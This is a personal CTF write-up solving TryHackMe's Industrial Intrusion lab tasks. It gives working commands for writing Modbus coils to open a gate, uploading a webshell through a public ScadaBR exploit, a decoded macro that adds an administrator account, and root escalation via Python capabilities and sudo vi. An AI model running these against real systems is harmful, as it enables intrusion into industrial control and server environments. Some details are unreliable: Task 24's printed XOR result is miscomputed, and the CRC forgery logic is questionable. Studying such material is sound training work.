---
description: Appl3Tree's full detailed write-up of the TryHackMe Industrial Intrusion CTF.
title: TryHackMe – Industrial Intrusion CTF Full Write-up
date: 2025-07-02 09:00:00 -0700
categories:
  - CTF Writeups
tags:
  - TryHackMe
  - CTF
  - walkthrough
  - writeup
  - OT security
  - cybersecurity
show_image_post: true
image: /assets/img/infocards/thm-industrial-ctf.png

---

## 📑 **Table of Contents**

- [Introduction](#introduction)
- [Task 3 – Breach](#task-3--breach)
- [Task 4 – Discord](#task-4--discord)
- [Task 5 – OSINT 1](#task-5--osint-1)
- [Task 6 – OSINT 2](#task-6--osint-2)
- [Task 7 – OSINT 3](#task-7--osint-3)
- [Task 10 – Brr v1](#task-10--brr-v1)
- [Task 13 – Orcam](#task-13--orcam)
- [Task 15 – Chess Industry](#task-15--chess-industry)
- [Task 16 – Under Construction](#task-16--under-construction)
- [Task 20 – Echoed Streams](#task-20--echoed-streams)
- [Task 21 – CRC Me If You Can](#task-21--crc-me-if-you-can)
- [Task 22 – Rogue Poller](#task-22--rogue-poller)
- [Task 23 – Register Sweep](#task-23--register-sweep)
- [Task 24 – Auth](#task-24--auth)

---

<a id="introduction"></a>

## 🏭 **Introduction**

The [**Industrial Intrusion CTF**](https://tryhackme.com/industrial-intrusion?utm_source=discord&utm_medium=social&utm_campaign=industrialintrusionctf) on TryHackMe is a hands-on challenge designed to simulate real-world attacks against Operational Technology (OT) environments.

This event focuses on:

- Modbus manipulation
- OT protocol exploitation
- Network forensics
- OSINT investigations
- Embedded device reversing

Each task reinforces critical skills for **red teamers, blue teamers, and ICS security professionals** looking to expand their knowledge in industrial cybersecurity.

---

<a id="task-3--breach"></a>

## 📝 **Task 3 – Breach**

### 🗂️ **Category:** Breach

### 🎯 **Difficulty:** Beginner

### 🏷️ **Flag:** THM{s4v3\_th3\_d4t3\_27\_jun3}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Port scan (full TCP)**

```bash
nmap -p- -Pn -n --open -T5 10.10.6.209
```

✅ Discovered **port 502 (Modbus TCP)** open.

---

#### 2. **Reviewed Node-RED flows (contextual challenge hint)**

* Identified:

  * **Coil 20** → Motion detector
  * **Coil 25** → Badge authentication

---

#### 3. **Tested Modbus coil writes with mbtget**

Because `mbtget -r` syntax failed, used these exact working commands:

```bash
mbtget -w5 1 -u 1 -a 20 10.10.6.209  # Sets motion detector coil
mbtget -w5 1 -u 1 -a 25 10.10.6.209  # Sets badge authentication coil
```

✅ Both wrote successfully.

---

#### 4. **Verified gate did not open**

Hypothesised missing **gate trigger coil**.

---

#### 5. **Enumerated coils (0-40) to identify potential triggers**

```bash
mbtget -r1 -u 1 -a 0 -n 40 10.10.6.209
```

✔️ Found coils 20 and 25 were **1**, others **0**.

---

#### 6. **Tested candidate gate trigger (coil 30)**

```bash
mbtget -w5 1 -u 1 -a 30 10.10.6.209
```

✅ **Gate opened**, revealing flag:

```
THM{s4v3_th3_d4t3_27_jun3}
```

---

### 💡 **Lessons Learned**

* Modbus logic often separates **preconditions (badge/motion)** from **action triggers (gate open coil)**.
* Always scan for unreferenced coils when flows don’t deploy expected actions.

---

<a id="task-4--discord"></a>

## 📝 **Task 4 – Discord**

### 🗂️ **Category:** Discord

### 🎯 **Difficulty:** Beginner

### 🏷️ **Flag:** THM{D15C0RD\_57A5H\_C0MM4ND5}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Joined challenge Discord server.**

#### 2. **Executed slash command to retrieve flag:**

```
/secret-function
```

✅ Returned:

```
THM{D15C0RD_57A5H_C0MM4ND5}
```

---

### 💡 **Lessons Learned**

* Always check provided Discord integrations for slash commands during OSINT or CTF onboarding challenges.

---

<a id="task-5--osint-1"></a>

## 📝 **Task 5 – OSINT 1**

### 🗂️ **Category:** OSINT

### 🎯 **Difficulty:** Beginner

### 🏷️ **Flag:** THM{Su5sss}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Challenge prompt:**

Investigate **virelia-water.it.com** phishing infrastructure.

#### 2. **Used crt.sh to enumerate subdomains.**

✅ Found:

* **stage0.virelia-water.it.com**
* **54484d7b5375357373737d.virelia-water.it.com**

---

#### 3. **Decoded hex subdomain**

```bash
echo 54484d7b5375357373737d | xxd -r -p
```

✅ Output:

```
THM{Su5sss}
```

---

### 💡 **Lessons Learned**

* Hex-encoded subdomains often encode flags directly in OSINT challenges.

---

<a id="task-6--osint-2"></a>

## 📝 **Task 6 – OSINT 2**

### 🗂️ **Category:** OSINT

### 🎯 **Difficulty:** Easy

### 🏷️ **Flag:** THM{uplink\_channel\_confirmed}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Challenge prompt:**

Investigate **uplink fallback infrastructure**.

#### 2. **Inspected webpage source**

✅ Found script reference:

```
https://raw.githubusercontent.com/SanTzu/uplink-config/refs/heads/main/init.js
```

---

#### 3. **Viewed JS file contents:**

```js
var beacon = {
  session_id: "O-TX-11-403",
  fallback_dns: "uplink-fallback.virelia-water.it.com",
  token: "JBSWY3DPEBLW64TMMQQQ=="
};
```

✅ Identified **uplink-fallback.virelia-water.it.com** as target.

---

#### 4. **Checked DNS TXT records for subdomain**

✅ Found Base64-encoded string:

```
eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=
```

---

#### 5. **Decoded repeatedly to reveal JSON:**

```json
{
  "session": "T-CN1-172",
  "flag": "THM{uplink_channel_confirmed}"
}
```

---

### 💡 **Lessons Learned**

* Always inspect **JS config files** for embedded infrastructure clues.
* Repeated Base64 decodes are common CTF obfuscation.

---

<a id="task-7--osint-3"></a>

## 📝 **Task 7 – OSINT 3**

### 🗂️ **Category:** OSINT

### 🎯 **Difficulty:** Medium

### 🏷️ **Flag:** THM{h0pe\_th1s\_k3y\_doesnt\_le4d\_t0\_m3}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Checked removed OT alert report URL:**

```
https://virelia-water.it.com/mail-archives/ot-alerts/2025-06.html
```

✅ 404 Not Found.

---

#### 2. **Manually searched GitHub for virelia-water repos.**

✅ Found:

```
https://github.com/virelia-water/compliance
```

---

#### 3. **Reviewed commit history.**

Found commit:

> “Embed PGP-signed OT alert for June 2025”

---

#### 4. **Extracted embedded PGP signed message.**

#### 5. **Saved as ot\_alert.asc and verified with GPG:**

```bash
gpg --verify ot_alert.asc
```

✅ **Issuer email:** [alerts@virelia-water.it.com](mailto:alerts@virelia-water.it.com)

---

#### 6. **Queried keyserver.ubuntu.com for key**

✅ UID contained flag:

```
THM{h0pe_th1s_k3y_doesnt_le4d_t0_m3}
```

---

### 💡 **Lessons Learned**

* GitHub commits can store critical artifacts when original resources are removed.
* PGP UID metadata is a common CTF flag hiding location.

---

<a id="task-10--brr-v1"></a>

## 📝 **Task 10 – Brr v1**

### 🗂️ **Category:** Web

### 🎯 **Difficulty:** Easy

### 🏷️ **Flag:** THM{rce\_archieved\_through\_script\_injection}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Ran full port scan:**

```
nmap -p- -Pn -n --open -T5 10.10.132.124
```

✅ Discovered:
22 (SSH), 80 (HTTP), 5901 (VNC), 8080 (ScadaBR).

---

#### 2. **Navigated to port 8080:**

*Found ScadaBR login portal.*

---

#### 3. **Tested default credentials:**

```
admin:admin
```

✅ **Successful login.**

---

#### 4. **Searched for exploit:**

```
searchsploit scadabr
```

✅ Found exploit **49734.py** for arbitrary file upload (Windows).

---

#### 5. **Executed exploit:**

```bash
python2 49734.py 10.10.132.124 8080 admin admin
```

✅ Uploaded .jsp webshell successfully.

---

#### 6. **Retrieved flag via webshell.**

```
THM{rce_archieved_through_script_injection}
```

---

### 💡 **Lessons Learned**

* Always test **default SCADA credentials**.
* Searchsploit remains essential for rapid exploit identification.

---

<a id="task-13--orcam"></a>

## 📝 **Task 13 – Orcam**

### 🗂️ **Category:** Forensics

### 🎯 **Difficulty:** Easy

### 🏷️ **Flag:** THM{Ev1l\_M\@Cr0}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Opened writing\_template.eml**

✅ Found base64 encoded macro-enabled doc (.docm).

---

#### 2. **Decoded & analyzed file**

```bash
base64 -d > malware.docm
olevba malware.docm
```

✅ Macro revealed XOR encoded byte array.

---

#### 3. **Parsed decoding logic**

* Macro used `"l33t"` as XOR key
* Allocated memory, decoded bytes, and executed shellcode.

---

#### 4. **Manual decoding**

* Wrote Python script to XOR each byte with "l33t".
* Decoded payload revealed command:

```
net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add
```

✅ Base64 decoded password:

```
THM{Ev1l_M@Cr0}
```

---

### 💡 **Lessons Learned**

* OLEVBA + manual emulation decodes nearly all macro-based flags.
* Always decode suspicious byte arrays with their revealed XOR keys.

---

<a id="task-15--chess-industry"></a>

## 📝 **Task 15 – Chess Industry**

### 🗂️ **Category:** Boot2Root

### 🎯 **Difficulty:** Beginner

### 🏷️ **Flags:**

* User: THM{bishop\_to\_c4\_check}
* Root: THM{check\_check\_check\_mate}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Enumerated ports:**

22 (SSH), 79 (finger), 80 (http).

---

#### 2. **Used finger enumeration:**

```bash
finger @10.10.x.x
```

✅ Found users: magnus, fabiano, hikaru.

---

#### 3. **Fingered fabiano:**

✅ Revealed base64 encoded .plan field.

#### 4. **Decoded credentials:**

```
echo "base64string" | base64 -d
```

✅ fabiano\:o3jVTktarGQI07q

---

#### 5. **SSH as fabiano, retrieved user flag:**

```
THM{bishop_to_c4_check}
```

---

#### 6. **Privilege escalation**

Checked capabilities:

```bash
getcap -r / 2>/dev/null
```

✅ Found cap\_setuid=ep on /usr/bin/python3.10.

---

#### 7. **Exploited capability:**

```bash
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

✅ Got root, retrieved root flag:

```
THM{check_check_check_mate}
```

---

### 💡 **Lessons Learned**

* Finger service leaks remain critical on IoT networks.
* Capability-based escalations bypass traditional sudo restrictions.

---

<a id="task-16--under-construction"></a>

## 📝 **Task 16 – Under Construction**

### 🗂️ **Category:** Boot2Root

### 🎯 **Difficulty:** Easy

### 🏷️ **Flags:**

* User: THM{nic3\_j0b\_You\_got\_it\_w00tw00t}
* Root: THM{y0u\_g0t\_it\_welldoneeeee}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Directory busting revealed:**

```
/keys/
```

✅ Navigated to /keys/, found multiple keys.

---

#### 2. **Checked each key, only key9 had content.**

Downloaded key9, cleaned it, then SSH’d as dev:

```bash
chmod 600 key9
ssh -i key9 dev@10.10.x.x
```

---

#### 3. **Privilege escalation**

Checked sudo permissions:

```bash
sudo -l
```

✅ vi allowed without password.

---

#### 4. **Escalated via vi:**

```
sudo vi
:!bash
```

✅ Root shell obtained.

---

### 💡 **Lessons Learned**

* Always check for leftover SSH keys in exposed directories.
* vi sudo permissions remain an evergreen escalation vector.

---

<a id="task-20--echoed-streams"></a>

## 📝 **Task 20 – Echoed Streams**

### 🗂️ **Category:** Crypto

### 🎯 **Difficulty:** Easy

### 🏷️ **Flag:** THM{Echo\_Telemetry}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Challenge context**

Two AES-GCM encrypted packets used **the same nonce** (a critical vulnerability).

* **First packet:** known telemetry plaintext.
* **Second packet:** sabotage command (unknown plaintext).

---

#### 2. **Downloaded cipher1.bin (telemetry) and cipher2.bin (sabotage)**

Each file contained:

```
[16-byte nonce][96-byte ciphertext][16-byte GCM tag]
```

---

#### 3. **Approach**

Used **AES-GCM nonce reuse vulnerability**:

✅ In AES-GCM:

```
cipher2 ^ cipher1 = plaintext2 ^ plaintext1
```

Therefore,

```
plaintext2 = plaintext1 ^ (cipher1 ^ cipher2)
```

---

#### 4. **Python solution**

```python
from Crypto.Util.strxor import strxor

# Load known plaintext (telemetry string)
pt1 = b'BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;'

# Load both ciphertexts
with open('cipher1.bin','rb') as f1, open('cipher2.bin','rb') as f2:
    c1 = f1.read()
    c2 = f2.read()

# Extract ciphertexts only (skip nonce and tags)
ct1 = c1[16:16+96]
ct2 = c2[16:16+96]

# XOR to recover sabotage plaintext
pt2 = strxor(strxor(ct1, ct2), pt1)

print(pt2.decode())
```

✅ **Output flag:**

```
THM{Echo_Telemetry}
```

---

### 💡 **Lessons Learned**

* Never reuse nonces with AES-GCM.
* XOR logic for same-nonce ciphertexts quickly recovers unknown plaintexts.

---

<a id="task-21--crc-me-if-you-can"></a>

## 📝 **Task 21 – CRC Me If You Can**

### 🗂️ **Category:** Crypto

### 🎯 **Difficulty:** Medium

### 🏷️ **Flag:** THM{crc\_m4c\_c0mprom1s3d\_2093982}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Challenge context**

* Interact with **CRC-Oracle (port 1501)**: returns full frame with CRC for any payload.
* **Control server (port 1500)**: accepts framed payload, returns flag on correct kill switch command.

---

#### 2. **Reviewed provided gateway\_proto.py**

* CRC implemented with **POLY=0x04C11DB7**, standard IEEE CRC32.

---

#### 3. **Generated dummy frame**

Sent dummy payload to Oracle:

```bash
echo -n "AAAA" | nc 10.10.17.201 1501 | xxd
```

✅ Returned:

```
cafe 0504 41414141 [CRC]
```

---

#### 4. **Calculated required delta between dummy CRC and target CRC**

Used Python script:

```python
from gateway_proto import crc32
from pwn import *

# Target CRC observed
target_crc = 0x31bcbbdd

# Dummy CRC (from oracle)
dummy = b'AAAA'
dummy_crc = crc32(dummy)

# Calculate delta
delta = target_crc ^ dummy_crc

# Forge final payload by XORing last 4 bytes with delta
payload = bytearray(dummy)
payload[-4:] = p32(u32(payload[-4:]) ^ delta)

with open('kill_frame.bin','wb') as f:
    f.write(payload)
```

---

#### 5. **Sent forged frame**

```bash
nc 10.10.17.201 1500 < kill_frame.bin
```

✅ Returned:

```
THM{crc_m4c_c0mprom1s3d_2093982}
```

---

### 💡 **Lessons Learned**

* CRCs are not secure MACs. Oracle-based CRC forgery is trivial with linear XOR property.

---

<a id="task-22--rogue-poller"></a>

## 📝 **Task 22 – Rogue Poller**

### 🗂️ **Category:** Networking

### 🎯 **Difficulty:** Beginner

### 🏷️ **Flag:** THM{1nDu5tr14L\_r3g1st3rs}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Opened PCAP in Wireshark.**

✅ Filtered by:

```
tcp.port == 502
```

(Modbus TCP traffic)

---

#### 2. **Followed TCP stream**

✅ Observed Modbus read register requests.

---

#### 3. **Interpreted decoded registers**

Data retrieved revealed ASCII string:

```
THM{1nDu5tr14L_r3g1st3rs}
```

---

### 💡 **Lessons Learned**

* PCAP analysis with correct protocol filters quickly surfaces plaintext register data.

---

<a id="task-23--register-sweep"></a>

## 📝 **Task 23 – Register Sweep**

### 🗂️ **Category:** Networking

### 🎯 **Difficulty:** Easy

### 🏷️ **Flag:** THM{m4nu4l\_p0ll1ng\_r3g1st3rs}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Challenge context**

Scan Modbus TCP holding registers for ASCII-encoded flag.

---

#### 2. **Dumped full register space**

Due to **mbtget -n 125** limit, ran in two batches:

```bash
mbtget -r3 -a 0 -n 125 -hex 10.10.42.182 > reg1.txt
mbtget -r3 -a 125 -n 75 -hex 10.10.42.182 > reg2.txt
```

---

#### 3. **Parsed and converted to ASCII**

**Script used:**

```bash
grep -o '0x[0-9a-fA-F]*' reg1.txt reg2.txt | while read reg; do
  hex=${reg:4:2}${reg:2:2}
  echo -n $hex | xxd -r -p
done
```

✅ Output revealed flag embedded among noise:

```
THM{m4nu4l_p0ll1ng_r3g1st3rs}
```

---

### 💡 **Lessons Learned**

* Always handle endianness swaps when parsing Modbus register data.
* Automate register-to-ASCII conversion for quick inspection.

---

<a id="task-24--auth"></a>

## 📝 **Task 24 – Auth**

### 🗂️ **Category:** Reversing

### 🎯 **Difficulty:** Easy

### 🏷️ **Flag:** THM{Simple\_tostart\_nice\_done\_mwww}

---

### 🔍 **Step-by-Step Walkthrough**

#### 1. **Reviewed provided ELF binary in Ghidra.**

Located **transform function**:

```c
input[i] ^= 0x55;
```

✅ Input XOR’d with 0x55 to check against hardcoded value:

```
0xefcdab8967452301
```

---

#### 2. **Calculated required pre-XOR input**

Used Python:

```python
target = 0xefcdab8967452301
code = target ^ 0x5555555555555555
print(hex(code))
```

✅ Result: `0xba98fecc32407654`

---

#### 3. **Converted to byte input and sent via nc**

```bash
echo -ne '\x54\x76\x10\x32\xdc\xfe\x98\xba\n' | nc 10.10.83.12 9005
```

✅ Returned:

```
THM{Simple_tostart_nice_done_mwww}
```

---

### 💡 **Lessons Learned**

* Always inspect input transform logic to compute correct pre-transform payloads.
* Reverse engineering simple XOR-based checkers is quick with bitwise analysis.

---

> _Note: AI-assisted editing was only used to format into markdown headings and frontmatter. All technical content and steps remain original._
